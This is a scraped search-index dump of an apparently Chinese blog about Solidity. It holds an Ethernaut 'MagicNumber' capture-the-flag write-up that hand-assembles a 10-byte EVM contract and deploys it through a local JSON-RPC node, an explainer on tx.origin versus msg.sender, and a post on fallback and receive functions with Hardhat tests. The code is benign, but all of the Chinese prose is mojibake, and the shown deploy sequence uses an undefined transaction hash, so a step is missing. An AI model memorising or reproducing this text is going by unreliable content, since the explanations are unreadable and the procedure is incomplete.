MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"é¢˜ç›®è¦æ±‚ // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MagicNum { address public solver; constructor() {} function setSolver(address _solver) public { solver = _solver; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } è¦æ±‚ä¼ é€’ä¸€ä¸ªåˆçº¦åœ°å€ç»™setSolverå‡½æ•°,è¯¥åˆçº¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚: é¢˜ç›®ä¼šè°ƒç”¨åˆçº¦çš„whatIsTheMeaningOfLife()å‡½æ•°, å‡½æ•°è¿”å›magicnumber, é¢˜ç›®ä¸­å·²ç»ç»™å‡ºmagicnumberçš„å€¼æ˜¯42äº†, å¹¶ä¸”è¦æ±‚åˆçº¦è¶³å¤Ÿçš„å°, codesizeä¸èƒ½è¶…è¿‡10 (è¿™æ˜¯é‡ç‚¹) ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:1:0","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"æ€è·¯ ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:2:0","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"ä¸æ»¡è¶³è¦æ±‚çš„åˆçº¦ // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract WrongAnswer { function whatIsTheMeaningOfLife() public pure returns (uint256) { return 42; } } ç¼–è¯‘ solc --bin-runtime ./WrongAnswer.sol ======= WrongAnswer.sol:WrongAnswer ======= Binary of the runtime part: 6080604052348015600f57600080fd5b506004361060285760003560e01c8063650500c114602d575b600080fd5b60336047565b604051603e91906067565b60405180910390f35b6000602a905090565b6000819050919050565b6061816050565b82525050565b6000602082019050607a6000830184605a565b9291505056fea264697066735822122094dfbe4a86b9ebcf9fceb03023a0ac85fa65d89f9775f2deb822b0ad74fdda2364736f6c63430008110033 è¿™ä¹ˆå¤šä»£ç , å¤§å°è‚¯å®šè¶…è¿‡10äº† å¯¼å…¥åˆ° BinaryNinja, çœ‹çœ‹åˆ°åº•å¹²äº†äº›ä»€ä¹ˆéœ€è¦è¿™ä¹ˆå¤šä»£ç  å¯è§å…¶ä¸­äº§ç”Ÿäº†å¤§é‡\"æ™®é€šåˆçº¦\"éƒ½éœ€è¦çš„åˆ¤æ–­ä»£ç , å¯¹äºæˆ‘ä»¬å®Œæˆè¿™æ¬¡æŒ‘æˆ˜è€Œè¨€, è¿™äº›ä»£ç éƒ½æ˜¯ä¸éœ€è¦çš„. æˆ‘ä»¬éœ€è¦çš„æ˜¯\"åªè¦è°ƒç”¨æˆ‘ä»¬åˆçº¦, æˆ‘å°±ç›´æ¥è¿”å›42\" ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:2:1","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"æ‰‹å·¥æ’¸æ“ä½œç (å’Œå­—èŠ‚ç ) è¿è¡Œæ—¶ä»£ç  æˆ‘ä»¬éœ€è¦åˆçº¦åœ¨è¿è¡Œæ—¶, å¯¹äºä»»ä½•è°ƒç”¨éƒ½ç®€å•ç²—æš´åœ°è¿”å›42(0x2A) #å°†è¦è¿”å›çš„å€¼0x2Aå­˜å‚¨åˆ°å†…å­˜00ä½ç½® PUSH1 0x2A PUSH1 0x00 MSTORE #ä»å†…å­˜å–å‡ºå€¼å¹¶è¿”å› PUSH1 0x20 PUSH1 0x00 RETURN å…¶ä¸­è¦å­˜å‚¨çš„å†…å­˜ä½ç½®åœ¨è¿™ä¸ªé¢˜ç›®ä¸­ä¸é‡è¦, å½“åœ¨ä¸€ä¸ªæ­£å¸¸çš„åˆçº¦ä¸­éœ€è¦ç»™åˆçº¦é¢„ç•™ä¸€éƒ¨åˆ†å†…å­˜ç”¨äºä¿å­˜\"free memory pointer\"ç­‰ , ä¹Ÿå°±æ˜¯ä¸ºå•¥å¹³æ—¶ç¼–è¯‘çš„æ™®é€šåˆçº¦çš„å­—èŠ‚ç æ€»æ˜¯60806040 (PUSH1 0x80 PUSH1 0x40)å¼€å¤´çš„ ä¸Šé¢çš„ä»£ç å°±æ˜¯æˆ‘ä»¬åˆçº¦è¿è¡Œæ—¶çš„ä»£ç (runtime code), åˆšå¥½code size ä¸º 10 ç¿»è¯‘æˆå­—èŠ‚ç ä¸º: 0x602a60005260206000f3 æ“ä½œç ç¿»è¯‘æˆå­—èŠ‚ç , å¯ä»¥åœ¨https://www.evm.codes/?fork=merge å¯¹ç…§æ‰‹å·¥ç¿»è¯‘ ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…· https://github.com/crytic/pyevmasm åˆ›å»ºæ—¶ä»£ç  æˆ‘ä»¬ç°åœ¨æœ‰äº†åˆçº¦çš„è¿è¡Œæ—¶ä»£ç , ä½†è¿˜éœ€è¦å‘Šè¯‰EVMå¦‚ä½•å¸®æˆ‘ä»¬åˆ›å»ºå‡ºè¯¥åˆçº¦, è¿™å°±æ˜¯åˆ›å»ºåˆçº¦æ—¶çš„åˆå§‹åŒ–å·¥ä½œ, ç§°ä¸º\"creation time code\", æ¯”å¦‚åˆå§‹åŒ–å­˜å‚¨(è™½ç„¶æˆ‘ä»¬è¿™é‡Œæ²¡æœ‰éœ€è¦åˆå§‹åŒ–çš„å­˜å‚¨),å°†è¿è¡Œæ—¶ä»£ç æ”¾åˆ°åŒºå—é“¾ä¸Šç­‰. #è¿è¡Œæ—¶ä»£ç æ”¾åˆ°å†…å­˜ä¸­ PUSH10 0x602a60005260206000f3 PUSH1 0 MSTORE #å°†è¿è¡Œæ—¶ä»£ç è¿”å›ç»™evm,å‘Šè¯‰å®ƒæˆ‘ä»¬çš„åˆçº¦åœ¨å®é™…è¿è¡Œæ—¶ç”¨çš„è¿™ä¸ªä»£ç : 0x602a60005260206000f3 PUSH1 0xA PUSH1 0x16 RETURN å¹³æ—¶æˆ‘ä»¬ä½¿ç”¨solc --binæ—¶è¾“å‡ºçš„ä»£ç åŒ…å«äº†åˆ›å»ºæ—¶ä»£ç å’Œè¿è¡Œæ—¶ä»£ç  ä½¿ç”¨solc --bin-runtimeæ—¶åªè¾“å‡ºäº†è¿è¡Œæ—¶ä»£ç  ä¸Šé¢çš„ä»£ç ç¿»è¯‘æˆå­—èŠ‚ç : 0x69602a60005260206000f3600052600a6016f3 è¿™å°±æ˜¯åˆ›å»ºåˆçº¦æ—¶éœ€è¦å‘Šè¯‰evmçš„å…¨éƒ¨ä»£ç , é‡Œé¢åŒ…å«äº†åˆçº¦åˆå§‹åŒ–æ—¶éœ€è¦çš„ä»£ç å’Œè¿è¡Œæ—¶éœ€è¦çš„ä»£ç  åˆ›å»ºåˆçº¦ åˆ›å»ºåˆçº¦æ—¶ç”¨åˆ°çš„æ“ä½œç æ˜¯ CREATE https://www.evm.codes/?fork=merge å®ƒéœ€ä¸‰ä¸ªå‚æ•°: value: åˆ›å»ºæ—¶å‘é€ç»™æ–°å»ºè´¦æˆ·çš„ether offset: åˆå§‹åŒ–ä»£ç (å«è¿è¡Œæ—¶ä»£ç )åœ¨å†…å­˜ä¸Šçš„èµ·å§‹ä½ç½® size: åˆå§‹åŒ–ä»£ç (å«è¿è¡Œæ—¶ä»£ç )åœ¨å†…å­˜ä¸Šçš„å¤§å° å¦‚æœæ²¡æœ‰ä»£ç , åˆ™åˆ›å»ºçš„æ˜¯æ™®é€šå¤–éƒ¨è´¦æˆ· è¿”å›è´¦æˆ·(åˆçº¦)çš„åœ°å€ # save ini-code (runtime-code included in the ini-code) of new_account into memory PUSH32 0x69602a60005260206000f3600052600a6016f3 PUSH1 0 MSTORE # create new_account with ini-code # the new_account address will be put on the stack by CREATE PUSH1 0x13 PUSH1 0xd PUSH1 0 CREATE # LOG out the new_account address DUP1 PUSH1 0 PUSH1 0 LOG1 åˆ›å»ºå®Œæˆå, æˆ‘ä»¬å°†æ–°åˆçº¦åœ°å€ä»¥æ—¥å¿—çš„æ–¹å¼è¾“å‡º ä¸Šé¢çš„æ“ä½œç ç¿»è¯‘æˆå­—èŠ‚ç ä¸º: 0x7f0000000000000000000000000069602a60005260206000f3600052600a6016f36000526013600d6000f08060006000a1 è¿™å°±æ˜¯æˆ‘ä»¬è¦è§£å†³è¯¥æŒ‘æˆ˜æ‰€éœ€è¦çš„æ‰€æœ‰å­—èŠ‚ç  ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:2:2","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"éƒ¨ç½²åˆçº¦å’Œè·å–åˆçº¦åœ°å€ ç»§ç»­æ‰‹å·¥æ’¸ ä½¿ç”¨eth json rpc: å…³äºeth json-rpc: https://ethereum.org/zh/developers/docs/apis/json-rpc/ ~ â¯ node=http://localhost:8545 ~ â¯ bytecode=0x7f0000000000000000000000000069602a60005260206000f3600052600a6016f36000526013600d6000f08060006000a1 ~ â¯ sender_address=$(curl -s -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_accounts\",\"params\":[],\"id\":1}' $node | jq -r '.result[0]') ~ â¯ receipt=$(curl -s -X POST --data \"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\"eth_getTransactionReceipt\\\",\\\"params\\\":[\\\"$tx_hash\\\"],\\\"id\\\":1}\" $node) ~ â¯ echo \"receipt:\\n$receipt\" receipt: {\"id\":1,\"jsonrpc\":\"2.0\",\"result\":{\"transactionHash\":\"0xd8417440d0172b80fe53bda4c1842535c8043a276c7bfc2c8e8fca4993996b4d\",\"transactionIndex\":\"0x0\",\"blockNumber\":\"0x6e\",\"blockHash\":\"0xc592afe3a765a8592257ea0c26fcb2c36ed2253f1333a92b89cfab1a1df9da84\",\"from\":\"0x394026b8a8b7477ed47380da688bc5380b20096e\",\"to\":null,\"cumulativeGasUsed\":\"0x15916\",\"gasUsed\":\"0x15916\",\"contractAddress\":\"0xba18e0ee28dc90beebeb175001c8c658aeafc855\",\"logs\":[{\"address\":\"0xba18e0ee28dc90beebeb175001c8c658aeafc855\",\"blockHash\":\"0xc592afe3a765a8592257ea0c26fcb2c36ed2253f1333a92b89cfab1a1df9da84\",\"blockNumber\":\"0x6e\",\"data\":\"0x\",\"logIndex\":\"0x0\",\"removed\":false,\"topics\":[\"0x000000000000000000000000436526bd095c7d3109d9055fa854fe739eb8b5a4\"],\"transactionHash\":\"0xd8417440d0172b80fe53bda4c1842535c8043a276c7bfc2c8e8fca4993996b4d\",\"transactionIndex\":\"0x0\"}],\"logsBloom\":\"0x00000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000008000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000004000\",\"status\":\"0x1\",\"effectiveGasPrice\":\"0x2fb\",\"type\":\"0x2\"}} æ³¨æ„åˆ°æ—¥å¿—ä¸­çš„ 0x000000000000000000000000436526bd095c7d3109d9055fa854fe739eb8b5a4 åˆ é™¤æ‰éåœ°å€éƒ¨åˆ†çš„0, å¾—åˆ°æˆ‘ä»¬çš„æ–°å»ºçš„åˆçº¦åœ°å€ 0x436526bd095c7d3109d9055fa854fe739eb8b5a4 åœ¨æµè§ˆå™¨consoleä¸­ contract.setSolver(\"0x436526bd095c7d3109d9055fa854fe739eb8b5a4\") DONE! ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:3:0","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["web3"],"content":"å‚è€ƒè¿‡ç¨‹ redux-logger.js:1 action SET_BLOCK_NUM @ 16:09:27.395 contract.setSolver(\"0x436526bd095c7d3109d9055fa854fe739eb8b5a4\") PromiseÂ {\u003cpending\u003e, _events: Events, emit: Æ’, on: Æ’,Â â€¦} ^^.js:140 â›ï¸ Sent transaction â› undefined/tx/0x4c857aba0d8411943ff92749de816ef573ee4b2af1690694e6f7297a44e784d4 ^^.js:140 â›ï¸ Mined transaction â› undefined/tx/0x4c857aba0d8411943ff92749de816ef573ee4b2af1690694e6f7297a44e784d4 ^^.js:45 (â—*âˆ©_âˆ©*â—) æ­£åœ¨æäº¤å…³å¡å®ä¾‹... \u003c \u003c \u003c\u003cè¯·ç¨ç­‰\u003e\u003e \u003e \u003e redux-logger.js:1 action SUBMIT_LEVEL_INSTANCE @ 16:09:45.461 redux-logger.js:1 action SET_BLOCK_NUM @ 16:09:47.487 ^^.js:140 â›ï¸ Sent transaction â› undefined/tx/0x73992fbed5a4d9df155727e7b1b072eab65252c139a141a0a5431788c7a14be0 ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:140 â›ï¸ Mined transaction â› undefined/tx/0x73992fbed5a4d9df155727e7b1b072eab65252c139a141a0a5431788c7a14be0 ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:73 |[â—â–ªâ–ªâ—]| ç‰›é€¼ï¼, ä½ é€šè¿‡äº†è¿™å…³!!! ^^.js:56 redux-logger.js:1 action SET_BLOCK_NUM @ 16:09:57.389 ","date":"2023-01-19","objectID":"/ethernaut_19_magicnumber/:4:0","tags":["solidity"],"title":"Ethernaut 19 MagicNumber","uri":"/ethernaut_19_magicnumber/"},{"categories":["Blockchain"],"content":"åŸºæœ¬å«ä¹‰: ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:1:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"tx.origin: tx.origin è¡¨ç¤ºäº¤æ˜“çš„å‘èµ·è€…,è¿™ä¸ªå€¼åœ¨æ‰§è¡Œäº¤æ˜“æ—¶è‡ªåŠ¨è®¾ç½®ï¼Œç”¨äºè¡¨ç¤ºè¿™ä¸ªäº¤æ˜“æ˜¯ç”±å“ªä¸ªè´¦æˆ·å‘èµ·çš„. ä½¿ç”¨ tx.origin çš„åŸå› æ˜¯ï¼Œåœ¨ä»¥å¤ªåŠåŒºå—é“¾ä¸­ï¼Œäº¤æ˜“å¯èƒ½ä¼šç»è¿‡å¤šä¸ªä¸­é—´äººï¼Œæœ€ç»ˆåˆ°è¾¾ç›®æ ‡è´¦æˆ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œmsg.sender å¯èƒ½ä¼šå˜æˆä¸­é—´äººè´¦æˆ·çš„åœ°å€ï¼Œè€Œ tx.origin åˆ™å§‹ç»ˆè¡¨ç¤ºäº¤æ˜“çš„å‘èµ·è€…ã€‚ä½¿ç”¨ tx.origin å¯ä»¥ä¿è¯åœ¨æ£€æŸ¥æƒé™æ—¶ï¼Œå§‹ç»ˆæ£€æŸ¥äº¤æ˜“çš„å®é™…å‘èµ·è€…ã€‚ ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:1:1","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"msg.sender msg.sender è¡¨ç¤ºå½“å‰å‡½æ•°è°ƒç”¨çš„å‘é€è€…,è¿™ä¸ªå€¼åœ¨æ‰§è¡Œå‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨è®¾ç½®ï¼Œç”¨äºè¡¨ç¤ºè°åœ¨è°ƒç”¨å½“å‰å‡½æ•°. ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:1:2","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"ç®€å•ç†è§£: å¦‚æœAè°ƒç”¨äº†åˆçº¦Bçš„å‡½æ•°FB, é‚£ä¹ˆåœ¨å‡½æ•°FBä¸­, Aæ—¢æ˜¯tx.origin, ä¹Ÿæ˜¯msg.sender å¦‚æœAè°ƒç”¨äº†åˆçº¦C, åˆçº¦Cå†è°ƒç”¨äº†åˆçº¦Bçš„å‡½æ•°FB, é‚£ä¹ˆåœ¨å‡½æ•°FBä¸­, Aæ˜¯tx.origin, Cæ˜¯msg.sender ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:2:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"ä¸¾ä¾‹ ä¸‰ä¸ªåˆçº¦, å¤–éƒ¨åœ°å€è°ƒç”¨C, Cè°ƒç”¨B, Bè°ƒç”¨A // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.4; import \"hardhat/console.sol\"; contract A { function FA() public view { console.log(\"A-tx.origin:\", tx.origin); console.log(\"A-msg.sender:\", msg.sender); console.log(\"A-address:\", address(this)); } } contract B { function FB() public { console.log(\"B-tx.origin:\", tx.origin); console.log(\"B-msg.sender:\", msg.sender); console.log(\"B-address:\", address(this)); A a = new A(); a.FA(); } } contract C { function FC() public { console.log(\"C-tx.origin:\", tx.origin); console.log(\"C-msg.sender:\", msg.sender); console.log(\"C-address:\", address(this)); B b = new B(); b.FB(); } } //const { expect } = require('chai'); const { ethers } = require('hardhat'); describe('origin demo Test Suits', function () { it(\"æµ‹è¯•..\", async function () { const [owner, other] = await ethers.getSigners(); let facotry = await ethers.getContractFactory(\"C\"); const contract = await facotry.deploy(); await contract.FC(); }); }); è¾“å‡º C-tx.origin: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 C-msg.sender: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 C-address: 0x5fbdb2315678afecb367f032d93f642f64180aa3 B-tx.origin: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 B-msg.sender: 0x5fbdb2315678afecb367f032d93f642f64180aa3 B-address: 0xa16e02e87b7454126e5e10d957a927a7f5b5d2be A-tx.origin: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 A-msg.sender: 0xa16e02e87b7454126e5e10d957a927a7f5b5d2be A-address: 0x8ff3801288a85ea261e4277d44e1131ea736f77b åˆ†æä¸Šé¢çš„è¾“å‡º, å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™ä¸ªå›¾ ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:3:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"å®‰å…¨éšæ‚£ ç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºå¯¹tx.originæˆæƒå¯¼è‡´çš„å®‰å…¨éšæ‚£çš„æ–‡ç« , ä½†ä½¿ç”¨æ—¶è¦åŒºåˆ†ä½ çš„ä»£ç åˆ°åº•æ˜¯éœ€è¦tx.originè¿˜æ˜¯msg.sender ","date":"2022-12-06","objectID":"/solidity_tx_origin_msg_sender/:4:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­tx.originå’Œmsg.sender","uri":"/solidity_tx_origin_msg_sender/"},{"categories":["Blockchain"],"content":"Receiver receive() external payable { //... } ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:1:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"åŸºæœ¬ä½œç”¨ è®©åˆçº¦åœ°å€å¯ä»¥ä»¥çº¯è½¬è´¦çš„æ–¹å¼æ¥æ”¶ä»¥å¤ª, ç›´æ¥å½“å‘åˆçº¦åœ°å€å‘é€ä»¥å¤ªçš„æ—¶å€™, receiveå‡½æ•°å°†è¢«è°ƒç”¨ æ¯”å¦‚: // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.4; import \"hardhat/console.sol\"; contract Callee { receive() external payable { console.log( \"[LOG] got some money, from:\", msg.sender, \", value:\", msg.value ); } function getBalance() public view returns (uint) { return address(this).balance; } } const { expect } = require('chai'); const { ethers } = require('hardhat'); // https://docs.ethers.io/v5/ const { loadFixture } = require(\"@nomicfoundation/hardhat-network-helpers\"); describe('ReceiveEther Contract Test Suits', function () { // https://hardhat.org/tutorial/testing-contracts#reusing-common-test-setups-with-fixtures // loadFixtureå°†åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œè®¾ç½®ï¼Œå¹¶åœ¨å…¶ä»–æµ‹è¯•ä¸­å¿«é€Ÿè¿”å›åˆ°è¯¥çŠ¶æ€ã€‚ async function deployContractFixture() { const [owner, addr1] = await ethers.getSigners(); const facotry = await ethers.getContractFactory(\"Callee\"); const contract = await facotry.deploy(); return { contract, owner, addr1 }; } it(\"æµ‹è¯•1\", async function () { const { contract, owner, addr1 } = await loadFixture(deployContractFixture); let balance = await contract.getBalance(); expect(balance).to.equal(0); //send ether to contract await owner.sendTransaction({ to: contract.address, value: ethers.utils.parseEther(\"0.01\"), gasLimit: 50000 }); balance = await contract.getBalance(); expect(balance).to.equal(ethers.utils.parseEther(\"0.01\")); }); }); è¾“å‡º: â¯ npx hardhat test ./test/receive.test.js Compiled 1 Solidity file successfully ReceiveEther Contract Test Suits [LOG] got some money, from: 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266 , value: 10000000000000000 âœ” æµ‹è¯•1 (1044ms) 1 passing (1s) å¦‚æœæ²¡æœ‰receiveå‡½æ•° (æˆ–å…¶æ›¿ä»£å“, è§ä¸‹é¢çš„fallbackçš„é™„åŠ ä½œç”¨), åˆ™æ‰§è¡Œä¼šæŠ¥é”™ 1) ReceiveEther Contract Test Suits æµ‹è¯•1: Error: Transaction reverted: function selector was not recognized and there's no fallback nor receive function ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:1:1","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"æ³¨æ„ è¿™é‡Œè¯´çš„æ˜¯è®©åˆçº¦åœ°å€å¯ä»¥**ä»¥çº¯è½¬è´¦çš„æ–¹å¼**æ¥æ”¶ä»¥å¤ª è€Œä¸æ˜¯è¯´åˆçº¦åœ°å€ä¸Šå¯ä»¥ä¸å­˜é’±, æ¯”å¦‚è°ƒç”¨payableå‡½æ•°å°±ä¸æ˜¯\"çº¯è½¬è´¦\", è¿™æ—¶å€™æ˜¯ä¸éœ€è¦receiveå‡½æ•°çš„ function giveMoney() external payable { console.log( \"[LOG] giveMoney, from:\", msg.sender, \", value:\", msg.value ); } ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:1:2","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"Fallback fallback() external { //... } æˆ– fallback() external payable{ //... } ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:2:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"åŸºæœ¬ä½œç”¨: å½“å¯¹åˆçº¦è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°æ—¶, fallback()å°†è¢«æ‰§è¡Œ // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.4; import \"hardhat/console.sol\"; contract Callee { fallback() external { console.log(\"[LOG] you called one function which not exist \"); } function getBalance() public view returns (uint) { return address(this).balance; } } contract Caller { function callFunctionDoesNotExist(address _addr) public { (bool success, ) = _addr.call( abi.encodeWithSignature(\"doesNotExist()\") ); console.log(\"[LOG] address call return: \", success); } } const { ethers } = require('hardhat'); describe('Caller Contract Test Suits', function () { it(\"æµ‹è¯•è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°\", async function () { let facotry = await ethers.getContractFactory(\"Caller\"); let callerContract = await facotry.deploy(); facotry = await ethers.getContractFactory(\"Callee\"); let receiveContract = await facotry.deploy(); await callerContract.callFunctionDoesNotExist(receiveContract.address); }); }); è¾“å‡º â¯ npx hardhat test ./test/caller.test.js Compiled 1 Solidity file successfully Caller Contract Test Suits [LOG] you called one function which not exist [LOG] address call return: true âœ” æµ‹è¯•è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•° (1080ms) ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:2:1","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"é™„åŠ ä½œç”¨(ä¸æ¨èçš„) å½“æ²¡æœ‰receiveå‡½æ•°, å¹¶ä¸” fallback() ä¸º payableæ—¶ (ä¹Ÿå°±æ˜¯fallback() external payable), å……å½“receiveçš„è§’è‰². ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:2:2","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"2300gas receive å’Œ fallback ç”±äºå¹¶éç”¨æˆ·æ˜ç¡®è°ƒç”¨, æ‰€ä»¥gasæ˜¯å®šæ­»çš„2300, é‚£ä¹ˆä¸è¦åœ¨ä»–ä»¬çš„å‡½æ•°ä½“ä¸­åšé«˜æ¶ˆè€—gasçš„æ“ä½œ, è®°è®°æ—¥å¿—å°±ä¸é”™äº†:) ","date":"2022-11-30","objectID":"/solidity_fallback_receive_function/:3:0","tags":["solidity","L3","Web3.0"],"title":"Solidityä¸­çš„fallbackå’Œreceiveå‡½æ•°","uri":"/solidity_fallback_receive_function/"},{"categories":["Blockchain"],"content":"DMEOä»£ç  https://github.com/yinhui1984/imagehosting/blob/main/images/1669789488023678000.7z ä¸‹è½½å, è°ƒç”¨makefile: make init æ¥å®‰è£…ä¾èµ– .PHONY: test init: @echo \"Initializing the project\" npm init -y npm install hardhat npm install @nomicfoundation/hardhat-toolbox compile: npx hardhat compile test: @echo \"\\033[31mè¿è¡Œä½¿ç”¨jsç¼–å†™çš„æµ‹è¯•ç”¨ä¾‹\\033[m\" @# åé¢è·Ÿæ–‡ä»¶è·¯å¾„å¯ä»¥åªè¿è¡ŒæŸä¸ªæµ‹è¯•æ–‡ä»¶ï¼Œ æ¯”å¦‚ npx hardhat test ./test/ZombieAttack.test.js npx hardhat test 